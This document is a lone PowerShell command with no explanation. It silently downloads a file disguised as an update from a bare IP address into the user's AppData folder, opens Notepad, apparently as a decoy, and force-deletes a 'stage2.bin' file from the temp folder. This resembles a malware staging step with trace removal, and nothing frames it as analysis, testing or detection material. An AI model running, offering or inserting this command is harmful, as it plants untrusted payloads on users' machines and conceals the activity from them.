curl.exe -s -L -o "$env:APPDATA\update.dat" 'https://198.51.100.15:8443/update.dat'; & "notepad.exe"; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
